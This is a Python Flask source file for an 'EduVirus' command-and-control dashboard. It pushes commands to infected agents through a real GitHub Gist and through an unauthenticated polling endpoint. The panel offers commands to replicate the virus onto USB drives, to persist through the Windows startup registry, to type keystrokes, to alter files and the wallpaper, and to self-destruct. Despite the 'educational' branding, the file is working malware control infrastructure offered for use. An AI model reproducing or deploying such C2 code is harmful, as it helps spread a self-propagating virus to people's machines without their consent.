#!/usr/bin/env python3
"""
EDU-VIRUS C2 Dashboard
Flask web UI — Linear dark theme — Control all agents from your browser

Usage:
  python dashboard.py
  # Opens at http://127.0.0.1:5000

Default password: admin

Set a custom password:
  PASSWORD=secret python dashboard.py
"""

import os
import sys
import json
import hashlib
import subprocess
import tempfile
import time
import threading
import urllib.request
import ssl
from pathlib import Path
from flask import Flask, render_template_string, request, redirect, session, jsonify
from functools import wraps

# ===================== CONFIG =====================

GIST_ID = "99a46fc04b180fffdafc03584c0d5a2e"
GIST_FILE = "c2_command.txt"
RAW_URL = f"https://gist.githubusercontent.com/vLoon-jpg/{GIST_ID}/raw/{GIST_FILE}"
API_URL = f"https://api.github.com/gists/{GIST_ID}"

PASSWORD = os.environ.get("PASSWORD", "admin")
AGENTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agents.json")
HISTORY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "history.json")

app = Flask(__name__)
app.secret_key = hashlib.md5(PASSWORD.encode()).hexdigest()

_SSL_CTX = ssl._create_unverified_context()

# ===================== HELPERS =====================

def load_agents():
    if os.path.exists(AGENTS_FILE):
        with open(AGENTS_FILE) as f:
            return json.load(f)
    return []

def save_agents(agents):
    with open(AGENTS_FILE, "w") as f:
        json.dump(agents, f, indent=2)

def load_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE) as f:
            return json.load(f)
    return []

def save_history(entry):
    history = load_history()
    entry["time"] = time.strftime("%H:%M:%S")
    entry["date"] = time.strftime("%Y-%m-%d")
    history.insert(0, entry)
    if len(history) > 200:
        history = history[:200]
    with open(HISTORY_FILE, "w") as f:
        json.dump(history, f, indent=2)

def send_command(cmd, args, target=None):
    """Send a command to the Gist."""
    cmd_id = str(int(time.time() * 1000))

    if target:
        payload = {"cmd": cmd, "args": args, "id": cmd_id, "target": target}
    else:
        payload = {"cmd": cmd, "args": args, "id": cmd_id}

    content = json.dumps(payload)
    data = {
        "description": f"EDU-Virus C2 - {cmd} at {time.strftime('%H:%M')}",
        "files": {GIST_FILE: {"content": content}}
    }

    tmp = os.path.join(tempfile.gettempdir(), "dash_gist.json")
    with open(tmp, "w") as f:
        json.dump(data, f)

    result = subprocess.run(
        ["gh", "api", "-X", "PATCH", f"gists/{GIST_ID}",
         "--input", tmp, "--jq", f'.files["{GIST_FILE}"].content'],
        capture_output=True, text=True, timeout=15
    )
    os.unlink(tmp)

    success = result.returncode == 0

    # Log it
    save_history({
        "cmd": cmd,
        "args": args,
        "target": target or "ALL",
        "success": success,
        "cmd_id": cmd_id,
    })

    return success, content

def fetch_gist_content():
    """Get current Gist content."""
    try:
        # Try API first (fresher)
        url = API_URL
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/vnd.github+json"
        })
        resp = urllib.request.urlopen(req, timeout=10, context=_SSL_CTX)
        data = json.loads(resp.read().decode())
        content = data["files"][GIST_FILE]["content"]
        updated = data["updated_at"]
        return content, updated
    except Exception as e:
        # Fallback to raw URL
        try:
            req = urllib.request.Request(RAW_URL, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=10, context=_SSL_CTX)
            return resp.read().decode().strip(), None
        except:
            return None, None

# ===================== AUTH =====================

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated

# ===================== NGROK COMMAND STORE =====================
# Stores the latest command for virus polling (no auth needed — LAN only via ngrok)
_latest_command = {"cmd": None, "args": [], "id": None, "updated": None}

# ===================== ROUTES =====================

@app.route("/cmd/latest")
def cmd_latest():
    """Virus primary endpoint: returns the latest command as JSON. No auth needed."""
    return jsonify(_latest_command)

@app.route("/cmd/config")
def cmd_config():
    """Virus config endpoint: returns poll interval and other settings."""
    return jsonify({
        "poll_interval": 5,
        "version": 2,
        "fallback_urls": [
            "https://gist.githubusercontent.com/vLoon-jpg/99a46fc04b180fffdafc03584c0d5a2e/raw/c2_command.txt"
        ]
    })

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            session["logged_in"] = True
            return redirect("/")
        return render_template_string(LOGIN_HTML, error="Wrong password")
    return render_template_string(LOGIN_HTML, error=None)

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect("/login")

@app.route("/")
@login_required
def dashboard():
    agents = load_agents()
    history = load_history()[:20]
    content, updated = fetch_gist_content()

    # Parse current command for display
    current_cmd = "None"
    if content:
        try:
            data = json.loads(content)
            current_cmd = f"{data.get('cmd', '?')} {json.dumps(data.get('args', []))}"
        except:
            current_cmd = content[:60]

    return render_template_string(
        DASHBOARD_HTML,
        agents=agents,
        history=history,
        current_cmd=current_cmd,
        updated=updated or "unknown",
        agent_count=len(agents),
    )

@app.route("/api/send", methods=["POST"])
@login_required
def api_send():
    data = request.get_json()
    cmd = data.get("cmd", "").strip()
    args = data.get("args", [])
    target = data.get("target", None)

    if not cmd:
        return jsonify({"success": False, "error": "No command"})

    cmd_id = str(int(time.time() * 1000))
    
    # Update in-memory store for ngrok/VMs
    global _latest_command
    _latest_command = {
        "cmd": cmd,
        "args": args,
        "id": cmd_id,
        "target": target,
        "updated": time.strftime("%Y-%m-%dT%H:%M:%SZ")
    }

    success, content = send_command(cmd, args, target)
    return jsonify({
        "success": success,
        "content": content,
        "cmd": cmd,
        "target": target or "ALL"
    })

@app.route("/api/agents", methods=["GET", "POST", "DELETE"])
@login_required
def api_agents():
    if request.method == "GET":
        return jsonify(load_agents())

    if request.method == "POST":
        data = request.get_json()
        agents = load_agents()

        # Check if agent ID already exists
        existing = [a for a in agents if a["id"] == data["id"]]
        if existing:
            existing[0].update(data)
            existing[0]["last_seen"] = time.strftime("%Y-%m-%d %H:%M:%S")
        else:
            data["last_seen"] = time.strftime("%Y-%m-%d %H:%M:%S")
            data["added"] = time.strftime("%Y-%m-%d %H:%M:%S")
            agents.append(data)

        save_agents(agents)
        return jsonify({"success": True, "count": len(agents)})

    if request.method == "DELETE":
        data = request.get_json()
        agent_id = data.get("id")
        agents = load_agents()
        agents = [a for a in agents if a["id"] != agent_id]
        save_agents(agents)
        return jsonify({"success": True, "count": len(agents)})

@app.route("/api/fetch")
@login_required
def api_fetch():
    content, updated = fetch_gist_content()
    parsed = None
    if content:
        try:
            parsed = json.loads(content)
        except:
            parsed = {"raw": content[:100]}
    return jsonify({
        "content": content,
        "updated": updated,
        "parsed": parsed,
    })

@app.route("/api/history")
@login_required
def api_history():
    return jsonify(load_history())

# ===================== HTML TEMPLATES =====================

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EduVirus C2 — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: 'Inter', system-ui, sans-serif;
  font-feature-settings: 'cv01', 'ss03';
  background: #08090a;
  color: #f7f8f8;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}
.login-box {
  background: rgba(255,255,255,0.02);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 12px;
  padding: 40px;
  width: 360px;
}
h1 {
  font-size: 24px;
  font-weight: 510;
  letter-spacing: -0.288px;
  color: #f7f8f8;
  margin-bottom: 4px;
}
.subtitle {
  font-size: 15px;
  color: #8a8f98;
  margin-bottom: 24px;
  font-weight: 400;
}
input {
  width: 100%;
  background: rgba(255,255,255,0.02);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 6px;
  padding: 12px 14px;
  color: #f7f8f8;
  font-family: 'Inter', system-ui, sans-serif;
  font-size: 15px;
  outline: none;
  transition: border-color 0.15s;
}
input:focus {
  border-color: #5e6ad2;
}
button {
  width: 100%;
  margin-top: 16px;
  background: #5e6ad2;
  color: #fff;
  border: none;
  border-radius: 6px;
  padding: 10px 16px;
  font-family: 'Inter', system-ui, sans-serif;
  font-size: 15px;
  font-weight: 510;
  cursor: pointer;
  transition: background 0.15s;
}
button:hover { background: #7170ff; }
.error {
  color: #ef4444;
  font-size: 13px;
  margin-top: 12px;
}
</style>
</head>
<body>
<div class="login-box">
  <h1>EduVirus C2</h1>
  <div class="subtitle">Enter the password to control agents</div>
  <form method="POST">
    <input type="password" name="password" placeholder="Password" autofocus>
    <button type="submit">Authenticate</button>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
  </form>
</div>
</body>
</html>
"""

DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EduVirus C2 — Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: 'Inter', system-ui, sans-serif;
  font-feature-settings: 'cv01', 'ss03';
  background: #08090a;
  color: #f7f8f8;
  min-height: 100vh;
}
.layout { display: flex; min-height: 100vh; }

/* Sidebar */
.sidebar {
  width: 240px;
  background: #0f1011;
  border-right: 1px solid rgba(255,255,255,0.05);
  padding: 20px 16px;
  flex-shrink: 0;
}
.sidebar h2 {
  font-size: 18px;
  font-weight: 510;
  letter-spacing: -0.288px;
  color: #f7f8f8;
  margin-bottom: 3px;
}
.sidebar .sub {
  font-size: 12px;
  color: #62666d;
  margin-bottom: 20px;
  font-weight: 400;
}
.sidebar nav { display: flex; flex-direction: column; gap: 2px; }
.sidebar nav a {
  color: #8a8f98;
  text-decoration: none;
  padding: 8px 10px;
  border-radius: 6px;
  font-size: 14px;
  font-weight: 510;
  transition: all 0.1s;
}
.sidebar nav a:hover, .sidebar nav a.active {
  background: rgba(255,255,255,0.04);
  color: #f7f8f8;
}
.sidebar .badge {
  float: right;
  background: #5e6ad2;
  color: #fff;
  font-size: 10px;
  font-weight: 510;
  padding: 2px 6px;
  border-radius: 4px;
}

/* Main */
.main {
  flex: 1;
  padding: 28px 32px;
  max-width: 1200px;
}
.main h1 {
  font-size: 32px;
  font-weight: 510;
  letter-spacing: -0.704px;
  margin-bottom: 4px;
}
.main .bread {
  font-size: 13px;
  color: #62666d;
  margin-bottom: 28px;
}

/* Cards grid */
.card-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
  gap: 16px;
  margin-bottom: 28px;
}
.card {
  background: rgba(255,255,255,0.02);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 8px;
  padding: 20px;
}
.card h3 {
  font-size: 15px;
  font-weight: 590;
  color: #f7f8f8;
  margin-bottom: 12px;
  letter-spacing: -0.165px;
}
.card .stat {
  font-size: 28px;
  font-weight: 510;
  color: #f7f8f8;
}
.card .stat-label {
  font-size: 13px;
  color: #8a8f98;
  margin-top: 2px;
}

/* Command section */
.cmd-section {
  margin-bottom: 28px;
}
.cmd-section h2 {
  font-size: 20px;
  font-weight: 590;
  letter-spacing: -0.24px;
  color: #f7f8f8;
  margin-bottom: 16px;
}
.cmd-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 12px;
}

/* Buttons */
.btn {
  font-family: 'Inter', system-ui, sans-serif;
  font-feature-settings: 'cv01', 'ss03';
  font-weight: 510;
  font-size: 13px;
  cursor: pointer;
  transition: all 0.1s;
  border-radius: 6px;
}
.btn-ghost {
  background: rgba(255,255,255,0.02);
  color: #e2e4e7;
  border: 1px solid rgb(36, 40, 44);
  padding: 10px 14px;
  text-align: left;
  width: 100%;
  line-height: 1.4;
}
.btn-ghost:hover {
  background: rgba(255,255,255,0.05);
  border-color: rgba(255,255,255,0.12);
}
.btn-ghost .cmd-name {
  display: block;
  color: #f7f8f8;
  font-weight: 590;
  font-size: 14px;
  margin-bottom: 2px;
}
.btn-ghost .cmd-desc {
  display: block;
  color: #8a8f98;
  font-size: 12px;
  font-weight: 400;
}
.btn-primary {
  background: #5e6ad2;
  color: #fff;
  border: none;
  padding: 8px 16px;
}
.btn-primary:hover { background: #7170ff; }
.btn-danger {
  background: rgba(239,68,68,0.15);
  color: #ef4444;
  border: 1px solid rgba(239,68,68,0.3);
  padding: 8px 16px;
}
.btn-danger:hover {
  background: rgba(239,68,68,0.25);
}
.btn-sm {
  font-size: 12px;
  padding: 6px 12px;
  border-radius: 4px;
}

/* Input fields */
.input-group {
  display: flex;
  gap: 8px;
  align-items: center;
}
input[type="text"], input[type="number"] {
  background: rgba(255,255,255,0.02);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 6px;
  padding: 8px 10px;
  color: #f7f8f8;
  font-family: 'Inter', system-ui, sans-serif;
  font-size: 13px;
  outline: none;
  flex: 1;
}
input:focus { border-color: #5e6ad2; }

/* Command bar */
.cmd-bar {
  background: rgba(255,255,255,0.02);
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 8px;
  padding: 16px;
  margin-bottom: 28px;
  display: flex;
  gap: 10px;
  align-items: center;
  flex-wrap: wrap;
}
.cmd-bar label {
  font-size: 13px;
  color: #8a8f98;
  font-weight: 510;
}
.cmd-bar input { min-width: 160px; }
.cmd-bar .sep { color: #34343a; font-size: 16px; user-select: none; }

/* Table */
table {
  width: 100%;
  border-collapse: separate;
  border-spacing: 0;
}
table th {
  font-size: 12px;
  font-weight: 510;
  color: #62666d;
  text-align: left;
  padding: 8px 12px;
  border-bottom: 1px solid rgba(255,255,255,0.05);
}
table td {
  font-size: 14px;
  padding: 10px 12px;
  border-bottom: 1px solid rgba(255,255,255,0.03);
  color: #d0d6e0;
}
table td .cmd-tag {
  display: inline-block;
  background: rgba(94,106,210,0.2);
  color: #828fff;
  padding: 1px 8px;
  border-radius: 4px;
  font-size: 12px;
  font-weight: 510;
}
table tr:hover td { background: rgba(255,255,255,0.02); }

/* Status */
.status-dot {
  display: inline-block;
  width: 8px;
  height: 8px;
  border-radius: 50%;
  margin-right: 6px;
}
.status-dot.online { background: #10b981; }
.status-dot.offline { background: #62666d; }

/* Toast */
.toast {
  position: fixed;
  bottom: 20px;
  right: 20px;
  background: #191a1b;
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 8px;
  padding: 12px 20px;
  font-size: 13px;
  color: #d0d6e0;
  display: none;
  z-index: 100;
  max-width: 400px;
  box-shadow: rgba(0,0,0,0.4) 0px 4px 12px;
}
.toast.show { display: block; }
.toast.success { border-left: 3px solid #10b981; }
.toast.error { border-left: 3px solid #ef4444; }

/* Modal */
.modal-overlay {
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0,0,0,0.85);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 50;
}
.modal-overlay.show { display: flex; }
.modal {
  background: #191a1b;
  border: 1px solid rgba(255,255,255,0.08);
  border-radius: 12px;
  padding: 24px;
  width: 420px;
  max-width: 90vw;
}
.modal h3 { margin-bottom: 16px; }
.modal input { margin-bottom: 10px; }
.modal .actions { display: flex; gap: 8px; margin-top: 16px; justify-content: flex-end; }

/* Scrollbar */
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 3px; }

/* Responsive */
@media (max-width: 768px) {
  .layout { flex-direction: column; }
  .sidebar { width: 100%; border-right: none; border-bottom: 1px solid rgba(255,255,255,0.05); }
  .main { padding: 16px; }
  .card-grid { grid-template-columns: 1fr; }
  .cmd-grid { grid-template-columns: 1fr; }
}

.tab-bar {
  display: flex;
  gap: 2px;
  margin-bottom: 20px;
  border-bottom: 1px solid rgba(255,255,255,0.05);
  padding-bottom: 0;
}
.tab-bar button {
  background: transparent;
  border: none;
  padding: 10px 16px;
  color: #8a8f98;
  font-family: 'Inter', system-ui, sans-serif;
  font-size: 14px;
  font-weight: 510;
  cursor: pointer;
  border-bottom: 2px solid transparent;
  transition: all 0.1s;
}
.tab-bar button.active {
  color: #f7f8f8;
  border-bottom-color: #5e6ad2;
}
.tab-bar button:hover { color: #d0d6e0; }
.tab-content { display: none; }
.tab-content.active { display: block; }

/* Delete btn on agent rows */
.del-agent {
  background: none;
  border: none;
  color: #62666d;
  cursor: pointer;
  font-size: 16px;
  padding: 4px;
  border-radius: 4px;
}
.del-agent:hover { color: #ef4444; background: rgba(239,68,68,0.1); }
</style>
</head>
<body>
<div class="layout">
  <!-- Sidebar -->
  <div class="sidebar">
    <h2>EduVirus</h2>
    <div class="sub">C2 Command Center</div>
    <nav>
      <a href="#" class="active" onclick="switchTab('commands',this)">Commands</a>
      <a href="#" onclick="switchTab('agents',this)">Agents <span class="badge" id="agent-badge">{{ agent_count }}</span></a>
      <a href="#" onclick="switchTab('history',this)">History</a>
      <a href="#" onclick="switchTab('raw',this)">Raw Gist</a>
    </nav>
    <div style="margin-top: auto; padding-top: 20px;">
      <a href="/logout" style="color:#62666d; font-size:12px; text-decoration:none;">Logout</a>
    </div>
  </div>

  <!-- Main -->
  <div class="main">
    <h1>Command Center</h1>
    <div class="bread">Current command: <span style="color:#828fff;">{{ current_cmd }}</span> &middot; Gist updated: {{ updated[:19] }}</div>

    <!-- Quick command bar -->
    <div class="cmd-bar">
      <label>Quick:</label>
      <input type="text" id="quick-cmd" placeholder="command arg1 arg2..." style="min-width:200px;">
      <button class="btn btn-primary btn-sm" onclick="sendQuick()">Send</button>
      <span class="sep">|</span>
      <label>Target:</label>
      <input type="text" id="quick-target" placeholder="Agent ID (or ALL)" style="min-width:120px;">
    </div>

    <!-- Tab content -->
    <div id="tab-commands" class="tab-content active">
      <!-- Stats -->
      <div class="card-grid">
        <div class="card">
          <div class="stat" id="stat-agents">{{ agent_count }}</div>
          <div class="stat-label">Registered Agents</div>
        </div>
        <div class="card">
          <div class="stat" id="stat-commands">{{ history|length }}</div>
          <div class="stat-label">Commands Sent Today</div>
        </div>
        <div class="card">
          <div class="stat" id="stat-online">0</div>
          <div class="stat-label">Online Now</div>
        </div>
      </div>

      <!-- Command categories -->
      <div class="cmd-section">
        <h2>Annoyance</h2>
        <div class="cmd-grid">
          <button class="btn btn-ghost" onclick="showPrompt('popup')">
            <span class="cmd-name">popup</span>
            <span class="cmd-desc">Show message box with custom title &amp; text</span>
          </button>
          <button class="btn btn-ghost" onclick="showPrompt('notepad')">
            <span class="cmd-name">notepad</span>
            <span class="cmd-desc">Open N Notepad windows with custom text</span>
          </button>
          <button class="btn btn-ghost" onclick="showPrompt('mouse')">
            <span class="cmd-name">mouse</span>
            <span class="cmd-desc">Jiggle the mouse for N seconds</span>
          </button>
          <button class="btn btn-ghost" onclick="showPrompt('cursor')">
            <span class="cmd-name">cursor</span>
            <span class="cmd-desc">Move cursor in a pattern (spiral/square/random)</span>
          </button>
          <button class="btn btn-ghost" onclick="showPrompt('tray')">
            <span class="cmd-name">tray</span>
            <span class="cmd-desc">Open/close CD/DVD tray</span>
          </button>
          <button class="btn btn-ghost" onclick="showPrompt('flash')">
            <span class="cmd-name">flash</span>
            <span class="cmd-desc">Flash screen with color (red/green/blue/random)</span>
          </button>
        </div>
      </div>

      <div class="cmd-section">
        <h2>Visual &amp; Environment</h2>
        <div class="cmd-grid">
          <button class="btn btn-ghost" onclick="showPrompt('wallpaper')">
            <span class="cmd-name">wallpaper</span>
            <span class="cmd-desc">Change desktop wallpaper to an image URL</span>
          </button>
          <button class="btn btn-ghost" onclick="sendCmd('restore_wallpaper')">
            <span class="cmd-name">restore_wallpaper</span>
            <span class="cmd-desc">Restore original wallpaper</span>
          </button>
          <button class="btn btn-ghost" onclick="showPrompt('reversetxt')">
            <span class="cmd-name">reversetxt</span>
            <span class="cmd-desc">Reverse .txt files in a folder (reversible)</span>
          </button>
        </div>
      </div>

      <div class="cmd-section">
        <h2>Network &amp; Spread</h2>
        <div class="cmd-grid">
          <button class="btn btn-ghost" onclick="sendCmd('ping')">
            <span class="cmd-name">ping</span>
            <span class="cmd-desc">Show agent info in a message box</span>
          </button>
          <button class="btn btn-ghost" onclick="sendCmd('replicate')">
            <span class="cmd-name">replicate</span>
            <span class="cmd-desc">Copy virus to USB drives &amp; Public folder</span>
          </button>
          <button class="btn btn-ghost" onclick="sendCmd('persist')">
            <span class="cmd-name">persist</span>
            <span class="cmd-desc">Add to Windows startup registry</span>
          </button>
          <button class="btn btn-ghost" onclick="sendCmd('unpersist')">
            <span class="cmd-name">unpersist</span>
            <span class="cmd-desc">Remove from startup registry</span>
          </button>
        </div>
      </div>

      <div class="cmd-section">
        <h2>Danger Zone</h2>
        <div class="cmd-grid">
          <button class="btn btn-ghost" style="border-color: rgba(239,68,68,0.3);" onclick="showPrompt('typer')">
            <span class="cmd-name" style="color:#ef4444;">typer</span>
            <span class="cmd-desc">Simulate keystroke typing (active window)</span>
          </button>
          <button class="btn btn-ghost" style="border-color: rgba(239,68,68,0.3);" onclick="confirmKill()">
            <span class="cmd-name" style="color:#ef4444;">selfdestruct</span>
            <span class="cmd-desc">Remove all traces &amp; delete self (IRREVERSIBLE)</span>
          </button>
        </div>
      </div>
    </div>

    <!-- Agents tab -->
    <div id="tab-agents" class="tab-content">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
        <h2 style="font-size:20px; font-weight:590;">Registered Agents</h2>
        <button class="btn btn-primary btn-sm" onclick="showAddAgent()">+ Add Agent</button>
      </div>
      <table id="agents-table">
        <thead>
          <tr><th>ID</th><th>Hostname</th><th>Last Seen</th><th>Status</th><th></th></tr>
        </thead>
        <tbody>
          {% for a in agents %}
          <tr>
            <td><span style="font-family:'JetBrains Mono',monospace; font-size:13px; color:#828fff;">{{ a.id }}</span></td>
            <td>{{ a.hostname }}</td>
            <td style="font-size:12px; color:#62666d;">{{ a.last_seen }}</td>
            <td><span class="status-dot offline"></span>Offline</td>
            <td><button class="del-agent" onclick="deleteAgent('{{ a.id }}')">&times;</button></td>
          </tr>
          {% else %}
          <tr><td colspan="5" style="text-align:center; color:#62666d; padding:30px;">No agents registered. Send a `ping` command and add agents using the agent ID from the popup.</td></tr>
          {% endfor %}
        </tbody>
      </table>
    </div>

    <!-- History tab -->
    <div id="tab-history" class="tab-content">
      <h2 style="font-size:20px; font-weight:590; margin-bottom:16px;">Command History</h2>
      <table>
        <thead>
          <tr><th>Time</th><th>Target</th><th>Command</th><th>Args</th><th>Status</th></tr>
        </thead>
        <tbody>
          {% for h in history %}
          <tr>
            <td style="font-size:12px; color:#62666d;">{{ h.time }}</td>
            <td><span style="font-family:'JetBrains Mono',monospace; font-size:12px;">{{ h.target }}</span></td>
            <td><span class="cmd-tag">{{ h.cmd }}</span></td>
            <td style="font-size:13px; color:#8a8f98;">{{ h.args|join(' ') }}</td>
            <td>{% if h.success %}<span style="color:#10b981;">Sent</span>{% else %}<span style="color:#ef4444;">Failed</span>{% endif %}</td>
          </tr>
          {% else %}
          <tr><td colspan="5" style="text-align:center; color:#62666d; padding:30px;">No commands sent yet.</td></tr>
          {% endfor %}
        </tbody>
      </table>
    </div>

    <!-- Raw tab -->
    <div id="tab-raw" class="tab-content">
      <h2 style="font-size:20px; font-weight:590; margin-bottom:16px;">Raw Gist Content</h2>
      <div style="background:#0f1011; border:1px solid rgba(255,255,255,0.08); border-radius:8px; padding:16px;">
        <pre id="raw-content" style="font-family:'JetBrains Mono',monospace; font-size:13px; color:#d0d6e0; white-space:pre-wrap; word-break:break-all;">Loading...</pre>
      </div>
      <button class="btn btn-primary btn-sm" onclick="fetchRaw()" style="margin-top:12px;">Refresh</button>
    </div>
  </div>
</div>

<!-- Prompt Modal -->
<div class="modal-overlay" id="prompt-modal">
  <div class="modal">
    <h3 id="prompt-title">Command</h3>
    <div id="prompt-inputs"></div>
    <div class="actions">
      <button class="btn btn-ghost btn-sm" onclick="closePrompt()" style="width:auto;">Cancel</button>
      <button class="btn btn-primary btn-sm" onclick="executePrompt()" style="width:auto;">Send Command</button>
    </div>
  </div>
</div>

<!-- Add Agent Modal -->
<div class="modal-overlay" id="agent-modal">
  <div class="modal">
    <h3>Add Agent</h3>
    <input type="text" id="agent-id" placeholder="Agent ID (from ping popup)">
    <input type="text" id="agent-host" placeholder="Hostname (optional)">
    <div class="actions">
      <button class="btn btn-ghost btn-sm" onclick="closeAgentModal()" style="width:auto;">Cancel</button>
      <button class="btn btn-primary btn-sm" onclick="addAgent()" style="width:auto;">Add</button>
    </div>
  </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
let currentPromptCmd = '';
let promptArgs = [];

function switchTab(name, el) {
  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.sidebar nav a').forEach(a => a.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  if (el) el.classList.add('active');
  if (name === 'raw') fetchRaw();
}

function showToast(msg, type) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  setTimeout(() => t.classList.remove('show'), 3000);
}

async function api(endpoint, data, method) {
  const opts = {
    method: method || 'POST',
    headers: {'Content-Type': 'application/json'},
  };
  if (data) opts.body = JSON.stringify(data);
  const resp = await fetch(endpoint, opts);
  return resp.json();
}

function sendCmd(cmd, args) {
  const target = document.getElementById('quick-target').value.trim() || null;
  api('/api/send', {cmd, args: args || [], target}).then(r => {
    if (r.success) {
      showToast('Sent: ' + cmd + (args ? ' ' + args.join(' ') : ''), 'success');
      setTimeout(() => location.reload(), 1000);
    } else {
      showToast('Failed to send command', 'error');
    }
  });
}

function sendQuick() {
  const raw = document.getElementById('quick-cmd').value.trim();
  if (!raw) return;
  const parts = raw.split(/\s+/);
  const cmd = parts[0];
  const args = parts.slice(1);
  sendCmd(cmd, args);
  document.getElementById('quick-cmd').value = '';
}

function showPrompt(cmd) {
  currentPromptCmd = cmd;
  document.getElementById('prompt-title').textContent = cmd;
  const container = document.getElementById('prompt-inputs');
  container.innerHTML = '';

  const inputs = {
    popup: [
      {name: 'Title', default: 'System Notification'},
      {name: 'Message', default: 'Hello from EduVirus!'},
    ],
    notepad: [
      {name: 'Count', default: '3', type: 'number'},
      {name: 'Message', default: 'You got pranked!'},
    ],
    mouse: [
      {name: 'Seconds', default: '10', type: 'number'},
    ],
    cursor: [
      {name: 'Pattern', default: 'spiral'},
    ],
    tray: [
      {name: 'Action', default: 'open'},
    ],
    flash: [
      {name: 'Color', default: 'random'},
      {name: 'Flashes', default: '3', type: 'number'},
    ],
    wallpaper: [
      {name: 'Image URL', default: 'https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png'},
    ],
    reversetxt: [
      {name: 'Folder Path', default: '.'},
    ],
    typer: [
      {name: 'Text', default: 'Hello from EduVirus!'},
    ],
  };

  const fields = inputs[cmd] || [{name: 'Arg', default: ''}];
  fields.forEach((f, i) => {
    const label = document.createElement('div');
    label.style.cssText = 'font-size:12px; color:#8a8f98; margin-bottom:3px;';
    label.textContent = f.name;
    const inp = document.createElement('input');
    inp.id = 'prompt-arg-' + i;
    inp.type = f.type || 'text';
    inp.value = f.default;
    inp.placeholder = f.name;
    inp.style.marginBottom = '10px';
    container.appendChild(label);
    container.appendChild(inp);
  });

  document.getElementById('prompt-modal').classList.add('show');
}

function executePrompt() {
  const modal = document.getElementById('prompt-modal');
  const inputs = modal.querySelectorAll('input');
  const args = Array.from(inputs).map(inp => inp.value);
  modal.classList.remove('show');
  sendCmd(currentPromptCmd, args);
}

function closePrompt() {
  document.getElementById('prompt-modal').classList.remove('show');
}

function confirmKill() {
  if (confirm('SELF-DESTRUCT: This will remove ALL traces and delete the virus from every agent. Continue?')) {
    sendCmd('kill');
  }
}

function showAddAgent() {
  document.getElementById('agent-modal').classList.add('show');
}

function closeAgentModal() {
  document.getElementById('agent-modal').classList.remove('show');
}

async function addAgent() {
  const id = document.getElementById('agent-id').value.trim();
  const host = document.getElementById('agent-host').value.trim() || 'Unknown';
  if (!id) { showToast('Agent ID required', 'error'); return; }
  const r = await api('/api/agents', {id, hostname: host});
  if (r.success) {
    showToast('Agent added!', 'success');
    closeAgentModal();
    location.reload();
  }
}

async function deleteAgent(id) {
  if (!confirm('Remove agent ' + id + '?')) return;
  const r = await api('/api/agents', {id}, 'DELETE');
  if (r.success) location.reload();
}

async function fetchRaw() {
  const r = await api('/api/fetch', null, 'GET');
  document.getElementById('raw-content').textContent = r.content || 'No content';
}

// Poll for updates
setInterval(async () => {
  const r = await api('/api/fetch', null, 'GET');
  if (r.parsed) {
    document.getElementById('quick-cmd').placeholder = 'Last: ' + r.parsed.cmd + ' ' + JSON.stringify(r.parsed.args);
  }
  // Refresh stats
  const agents = await api('/api/agents', null, 'GET');
  document.getElementById('stat-agents').textContent = agents.length;
  document.getElementById('agent-badge').textContent = agents.length;
}, 5000);

// Load raw on start
fetchRaw();
</script>
</body>
</html>
"""

if __name__ == "__main__":
    print()
    print("  EduVirus C2 Dashboard")
    print("  " + "-" * 40)
    print(f"  URL:      http://127.0.0.1:5000")
    print(f"  Password: {PASSWORD}")
    print(f"  Gist:     {RAW_URL}")
    print(f"  Agents:   {AGENTS_FILE}")
    print("  " + "-" * 40)
    print("  Press Ctrl+C to stop")
    print()
    app.run(host="127.0.0.1", port=5000, debug=False, threaded=True)
